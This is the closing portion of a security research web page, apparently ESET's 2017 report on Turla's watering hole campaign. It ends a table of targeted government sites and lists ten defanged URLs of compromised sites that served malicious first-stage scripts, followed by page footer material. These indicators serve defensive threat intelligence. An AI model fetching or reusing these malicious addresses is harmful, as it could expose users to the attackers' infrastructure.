	<td class="column-1">hxxp://iraqiembassy.us</td><td class="column-2">Embassy of Iraq – USA</td>
</tr>
<tr class="row-18 even">
	<td class="column-1">hxxp://sai.gov.ua</td><td class="column-2">Management of road safety (Ukraine)</td>
</tr>
<tr class="row-19 odd">
	<td class="column-1">hxxp://www.mfa.gov.md</td><td class="column-2">Ministry of Foreign Affairs – Moldova</td>
</tr>
<tr class="row-20 even">
	<td class="column-1">hxxp://mkk.gov.kg</td><td class="column-2">State Personnel Service - Kyrgyzstan</td>
</tr>
</tbody>
</table>

<h2>Compromised websites used as first stage C&amp;C in watering hole campaigns</h2>
<ul>
<li>hxxp://www.mentalhealthcheck.net/update/counter.js (hxxp://bitly.com/2hlv91v+)</li>
<li>hxxp://www.mentalhealthcheck.net/script/pde.js</li>
<li>hxxp://drivers.epsoncorp.com/plugin/analytics/counter.js</li>
<li>hxxp://rss.nbcpost.com/news/today/content.php</li>
<li>hxxp://static.travelclothes.org/main.js</li>
<li>hxxp://msgcollection.com/templates/nivoslider/loading.php</li>
<li>hxxp://versal.media/?atis=509</li>
<li>hxxp://www.ajepcoin.com/UserFiles/File/init.php (hxxp://bit.ly/2h8Lztj+)</li>
<li>hxxp://loveandlight.aws3.net/wp-includes/theme-compat/akismet.php</li>
<li>hxxp://alessandrosl.com/core/modules/mailer/mailer.php</li>
</ul>
<p><em>Image credits: <a href="https://www.flickr.com/photos/boldonian/16437893146/in/photostream/lightbox/" target="_blank" rel="noopener noreferrer"><span class="_Tgc">©</span>David Robson/Flickr</a></em></p>

                            
                                                            <div class="dot">
                                    <span class="icomoon icon-icon_article_dot"></span>
                                </div>

                                <div class="meta">
                                    <div class="wls-authors wls-authors-footer">
                                                <div class="wls-author">
                        <div class="wls-author-name">
                <a href="https://www.welivesecurity.com/author/boutin/" title="Jean-Ian Boutin">
                    Jean-Ian Boutin                </a>
            </div>
        </div>
                                            </div>
                                    <span class="strong">
								        <time datetime="2017-06-06 14:00:56">6 Jun 2017 - 02:00PM</time>
                                    </span>
                                </div>
                            
                            <div class="widgets row">
                                <div class="col-md-12 col-sm-12 col-xs-12">
                                    <div class="heading-line col-md-12 col-sm-12 col-xs-12 no-padding">
                                        <h3><span class="text">Newsletter</span></h3>
                                    </div>
                                </div>
                                <div class="col-md-6 col-sm-6 col-xs-12 newsletter-wrapper">
                                    			
		<div class="heading-line col-md-12 no-padding sidebar-item clearfix">
			<h3>
				<span class="text">Newsletter</span>
			</h3>

			<form action="//liondigital.us3.list-manage.com/subscribe/post?u=b76f82b1cc198ab1d80665c99&amp;id=102b0810e2" class="basic-searchform col-md-12 col-sm-12 col-xs-12 no-padding newsletter" method="post" role="search">
				<div class="search-input clearfix">
					<input type="text" name="email" value="" placeholder="Email...">
					<button>
						Submit					</button>
				</div>
			</form>		
		</div>
                                </div>
                            </div>

                                                            <div class="similar-articles row">
                                    <div class="heading-line col-md-12 col-sm-12 col-xs-12">
                                        <h3><span class="text">Similar Articles</span></h3>
                                    </div>
                                                                            <article class="col-md-3 col-sm-3 col-xs-3">
                                            <div class="img-wrapper">
                                                <a href="https://www.welivesecurity.com/category/cybercrime/" class="category-tag-btn">Cybercrime</a>                                                <a href="https://www.welivesecurity.com/2021/03/18/fbi-cybercrime-losses-topped-us42billion-2020/"
                                                   class="related-article-thumb">
                                                    <img class="col-xs-12 no-padding clickable"
                                                         src="https://www.welivesecurity.com/wp-content/uploads/2021/03/fbi-cybercrime-losses-2020-ic3-623x432.jpg"
                                                         alt="Turla’s watering hole campaign: An updated Firefox extension abusing Instagram">
                                                </a>
                                            </div>
                                            <h4>
                                                <a href="https://www.welivesecurity.com/2021/03/18/fbi-cybercrime-losses-topped-us42billion-2020/">
                                                    FBI: Cybercrime losses topped US$4.2 billion in 2020                                                </a>
                                            </h4>
                                        </article>
                                                                            <article class="col-md-3 col-sm-3 col-xs-3">
                                            <div class="img-wrapper">
                                                <a href="https://www.welivesecurity.com/category/cybercrime/" class="category-tag-btn">Cybercrime</a>                                                <a href="https://www.welivesecurity.com/2021/03/03/not-all-cybercriminals-are-sophisticated/"
                                                   class="related-article-thumb">
                                                    <img class="col-xs-12 no-padding clickable"
                                                         src="https://www.welivesecurity.com/wp-content/uploads/2021/03/not-all-cybercriminals-are-sophisticated-623x432.jpg"
                                                         alt="Turla’s watering hole campaign: An updated Firefox extension abusing Instagram">
                                                </a>
                                            </div>
                                            <h4>
                                                <a href="https://www.welivesecurity.com/2021/03/03/not-all-cybercriminals-are-sophisticated/">
                                                    Not all cybercriminals are sophisticated                                                </a>
                                            </h4>
                                        </article>
                                                                            <article class="col-md-3 col-sm-3 col-xs-3">
                                            <div class="img-wrapper">
                                                <a href="https://www.welivesecurity.com/category/cybercrime/" class="category-tag-btn">Cybercrime</a>                                                <a href="https://www.welivesecurity.com/2021/02/09/hacker-attempts-poison-florida-city-water-supply/"
                                                   class="related-article-thumb">
                                                    <img class="col-xs-12 no-padding clickable"
                                                         src="https://www.welivesecurity.com/wp-content/uploads/2021/02/hackers-water-treatment-plant-attack-florida-623x427.jpg"
                                                         alt="Turla’s watering hole campaign: An updated Firefox extension abusing Instagram">
                                                </a>
                                            </div>
                                            <h4>
                                                <a href="https://www.welivesecurity.com/2021/02/09/hacker-attempts-poison-florida-city-water-supply/">
                                                    Hacker attempts to poison Florida city’s water supply                                                </a>
                                            </h4>
                                        </article>
                                                                            <article class="col-md-3 col-sm-3 col-xs-3">
                                            <div class="img-wrapper">
                                                <a href="https://www.welivesecurity.com/category/cybercrime/" class="category-tag-btn">Cybercrime</a>                                                <a href="https://www.welivesecurity.com/2021/01/28/emotet-botnet-disrupted-global-operation/"
                                                   class="related-article-thumb">
                                                    <img class="col-xs-12 no-padding clickable"
                                                         src="https://www.welivesecurity.com/wp-content/uploads/2021/01/emotet-botnet-disruption-law-enforcement-623x432.jpg"
                                                         alt="Turla’s watering hole campaign: An updated Firefox extension abusing Instagram">
                                                </a>
                                            </div>
                                            <h4>
                                                <a href="https://www.welivesecurity.com/2021/01/28/emotet-botnet-disrupted-global-operation/">
                                                    Emotet botnet disrupted in global operation                                                </a>
                                            </h4>
                                        </article>
                                                                    </div>
                            
                            <div class="comments row">
                                <div class="heading-line col-xs-12">
                                    <h3><span class="text">Discussion</span></h3>
                                                                            
<div id="disqus_thread"></div>
                                                                    </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </section>
    	</div> 	<footer id="site-footer">
		<div class="container">
			<div class="row">
				<div class="col-md-2">
                    <div class="hidden-sm hidden-xs">
                        <div class="logo-wrapper footer clearfix">
                            <div class="dark clearfix">
                                <a href="https://www.welivesecurity.com/" class="wls">
                                    <img src="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/img/new-logo/eset-wls-footer-1.svg" alt="Welivesecurity.com">
                                </a>
                                <a href="https://www.eset.com" class="eset">
                                    <img src="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/img/new-logo/eset-wls-footer-2.svg" alt="by ESET">
                                </a>
                            </div>
                        </div>
                    </div>
                    <div class="hidden-lg hidden-md">
                        <div class="logo-wrapper clearfix">
    <div class="dark clearfix">
        <a href="https://www.welivesecurity.com/" class="wls">
            <img src="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/img/new-logo/eset-wls-dark-header-1.svg" alt="Welivesecurity.com">
        </a>
        <a href="https://www.eset.com" class="eset">
            <img src="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/img/new-logo/eset-wls-dark-header-2.svg" alt="by ESET">
        </a>
    </div>
    <div class="light clearfix">
        <a href="https://www.welivesecurity.com/" class="wls">
            <img src="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/img/new-logo/eset-wls-light-header-1.svg" alt="Welivesecurity.com">
        </a>
        <a href="https://www.eset.com" class="eset">
            <img src="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/img/new-logo/eset-wls-light-header-2.svg" alt="by ESET">
        </a>
    </div>
</div>                    </div>
				</div>
				<nav id="footer" class="clearfix">
											<div class="mobile-block">
																<div class="col-md-2 col-md-offset-2">
										<ul>
																							<li>
													<a href="/">Home</a>
												</li>
																							<li>
													<a href="https://www.welivesecurity.com/about-us/">About Us</a>
												</li>
																							<li>
													<a href="https://www.welivesecurity.com/contact-us/">Contact Us</a>
												</li>
																					</ul>
									</div>
																<div class="col-md-2 ">
										<ul>
																							<li>
													<a href="https://www.welivesecurity.com/sitemap/">Sitemap</a>
												</li>
																							<li>
													<a href="https://www.welivesecurity.com/our-experts/">Our Experts</a>
												</li>
																							<li>
													<a href="https://eset.com">ESET</a>
												</li>
																					</ul>
									</div>
													</div>
											<div class="mobile-block">
																<div class="col-md-2 ">
										<ul>
																							<li>
													<a href="https://www.welivesecurity.com/research/">Research</a>
												</li>
																							<li>
													<a href="https://www.welivesecurity.com/category/how-to/">How To</a>
												</li>
																							<li>
													<a href="https://www.welivesecurity.com/categories/">Categories</a>
												</li>
																					</ul>
									</div>
																<div class="col-md-2 ">
										<ul>
																							<li>
													<a href="https://www.welivesecurity.com/rss-configurator/">RSS Configurator</a>
												</li>
																							<li>
													<a href="https://www.welivesecurity.com/news-widget-generator/">News Widget</a>
												</li>
																					</ul>
									</div>
													</div>
									</nav>
			</div>
			<div class="row">
				<div class="col-md-12 legal clearfix">
					<div class="wrap clearfix">
													<span>
								<a href="https://www.welivesecurity.com/privacy/">
									Privacy policy								</a>
							</span>
													<span>
								<a href="https://www.welivesecurity.com/legal-information/">
									Legal Information								</a>
							</span>
											</div>
					<span class="copyright pull-right">Copyright &copy; ESET, All Rights Reserved</span>
				</div>
							</div>
		</div>
	</footer>
	
	<button id="back-to-top" class="animated-scroll" data-target="absoluteTop">
		<span class="icomoon icon-icon_arrow"></span>
		<span class="text">Back to top</span>
	</button>

			<div class="social-wrapper-mobile hidden-lg hidden-md hidden-sm" id="mobile-article-sharer">
			<div class="col-xs-12">
				<div class="icons" style="text-align: center;">
											<a class="share-facebook" href="https://www.facebook.com/sharer/sharer.php?u=https%3A%2F%2Fwww.welivesecurity.com%2F2017%2F06%2F06%2Fturlas-watering-hole-campaign-updated-firefox-extension-abusing-instagram%2F" target="blank" data-toggle="tooltip" data-placement="top" data-original-title="Share on Facebook">
							<span class="icomoon icon-icon_fb"></span>
						</a>
											<a class="share-twitter" href="https://twitter.com/intent/tweet?https%3A%2F%2Fwww.welivesecurity.com%2F2017%2F06%2F06%2Fturlas-watering-hole-campaign-updated-firefox-extension-abusing-instagram%2F" target="blank" data-toggle="tooltip" data-placement="top" data-original-title="Share on Twitter">
							<span class="icomoon icon-icon_tw"></span>
						</a>
											<a class="share-linkedin" href="https://www.linkedin.com/shareArticle?mini=true&url=https%3A%2F%2Fwww.welivesecurity.com%2F2017%2F06%2F06%2Fturlas-watering-hole-campaign-updated-firefox-extension-abusing-instagram%2F" target="blank" data-toggle="tooltip" data-placement="top" data-original-title="Share on Linkedin">
							<span class="icomoon icon-icon_in"></span>
						</a>
									</div>
			</div>
		</div>
	
	<script>
		var baseUrl = "https://www.welivesecurity.com/";
	</script>
	
			<script>
            !function(){if(-1==window.document.cookie.indexOf("user_rec=1")){function e(e,o){var t=document.createElement("img");t.setAttribute("style","display:none"),t.src=e+o,window.document.body.appendChild(t)}function o(){d||Math.random(1e6,9999999),a="?v=1&cid="+d+"&tid="+l+"&dl="+g+"&t=event&ec=Tracking%20check%20-%20recurring&ea=Default%20status&ni=1&cd1="+w+"&aip=1&z="+Math.floor(1e6*Math.random(0,1)),c="?country=wls&gcode=defaultStatus&z="+Math.floor(1e6*Math.random(0,1)),e(u,a),e(s,c)}function t(){console.log("GA and GTM are loaded."),d=ga.getAll()[0].get("clientId"),a="?v=1&cid="+d+"&tid="+l+"&dl="+g+"&t=event&ec=Tracking%20check%20-%20recurring&ea=GA%20loaded,%20GTM%20loaded&ni=1&cd1="+w+"&aip=1&z="+Math.floor(1e6*Math.random(0,1)),c="?country=wls&gcode=11",e(u,a),e(s,c)}function n(){var e=new Date;e.setTime(e.getTime()+63072e6);var o="expires="+e.toUTCString();window.document.cookie="user_rec=1; "+o+"; path=/"}var d,a,c,i,r,l="UA-76266002-27",g=window.location.href,s="https://cdn1.esetstatic.com/ESET/INT/assets/img/check.png",u="https://www.google-analytics.com/collect",w="wls",m=0,h=function e(){i=window.ga&&ga.create?1:0,r=window.google_tag_manager?1:0,m++,console.log("Timer: ",m),h=setTimeout(e,500)};window.document.addEventListener&&(d=1e6*Math.random(1e6,9999999),a="?v=1&cid="+d+"&tid="+l+"&dl="+g+"&t=event&ec=Tracking%20check%20-%20recurring&ea=Script%20loaded&ni=1&cd1="+w+"&aip=1&z="+Math.floor(1e6*Math.random(0,1)),c="?country=wls&gcode=scriptLoaded&z="+Math.floor(1e6*Math.random(0,1)),e(u,a),e(s,c),window.addEventListener("beforeunload",o),window.ga&&ga.create&&window.google_tag_manager?(t(),window.removeEventListener("beforeunload",o),n()):(setTimeout(h,500),setTimeout(function(){clearTimeout(h),i&&r?t():i&&!r?(console.log("GA is loaded and GTM is blocked."),d=ga.getAll()[0].get("clientId"),a="?v=1&cid="+d+"&tid="+l+"&dl="+g+"&t=event&ec=Tracking%20check%20-%20recurring&ea=GA%20loaded,%20GTM%20blocked&ni=1&cd1="+w+"&aip=1&z="+Math.floor(1e6*Math.random(0,1)),c="?country=wls&gcode=10",e(u,a),e(s,c)):!i&&r?(console.log("GA is blocked and GTM is loaded."),d||Math.random(1e6,9999999),a="?v=1&cid="+d+"&tid="+l+"&dl="+g+"&t=event&ec=Tracking%20check%20-%20recurring&ea=GA%20blocked,%20GTM%20loaded&ni=1&cd1="+w+"&aip=1&z="+Math.floor(1e6*Math.random(0,1)),c="?country=wls&gcode=01",e(u,a),e(s,c)):i||r||(console.log("GA is blocked and GTM is blocked."),d||Math.random(1e6,9999999),a="?v=1&cid="+d+"&tid="+l+"&dl="+g+"&t=event&ec=Tracking%20check%20-%20recurring&ea=GA%20blocked,%20GTM%20blocked&ni=1&cd1="+w+"&aip=1&z="+Math.floor(1e6*Math.random(0,1)),c="?country=wls&gcode=00",e(u,a),e(s,c)),window.removeEventListener("beforeunload",o),n()},1e4)))}}();
		</script>
	
	<script src="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/build/js/main-0ba0c3843d.js"></script>
    <!-- Version: v1.1.76.32619db9.pro-azeu -->
    		<script type="text/javascript">
			var disqus_config = function () { 
				this.language = "en";
			};
			var CrayonSyntaxSettings = {"version":"_2.7.2_beta","is_admin":"0","prefix":"crayon-","setting":"crayon-setting","selected":"crayon-setting-selected","changed":"crayon-setting-changed","special":"crayon-setting-special","orig_value":"data-orig-value","debug":"", "numsVisible": false};
			var CrayonSyntaxStrings = {"copy":"Press %s to Copy, %s to Paste","minimize":"Click To Expand Code"};
		</script>
		<script src="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/static/js/crayon.min.js"></script>

			
		
    <script>
    	Main.init();
    </script>

    <script type='text/javascript'>
/* <![CDATA[ */
var countVars = {"disqusShortname":"welivesecurity"};
/* ]]> */
</script>
<script type='text/javascript' src='https://www.welivesecurity.com/wp-content/plugins/disqus-comment-system/public/js/comment_count.js?ver=3.0.16'></script>
<script type='text/javascript'>
/* <![CDATA[ */
var embedVars = {"disqusConfig":{"integration":"wordpress 3.0.16"},"disqusIdentifier":"94703 https:\/\/ba-infohub-web01-v.hq.eset.com\/?p=94703","disqusShortname":"welivesecurity","disqusTitle":"Turla\u2019s watering hole campaign: An updated Firefox extension abusing Instagram","disqusUrl":"https:\/\/www.welivesecurity.com\/2017\/06\/06\/turlas-watering-hole-campaign-updated-firefox-extension-abusing-instagram\/","postId":"94703"};
/* ]]> */
</script>
<script type='text/javascript' src='https://www.welivesecurity.com/wp-content/plugins/disqus-comment-system/public/js/comment_embed.js?ver=3.0.16'></script>
    <script src="https://assets.esetstatic.com/3PR/app.min.js"></script>
  </body>
</html>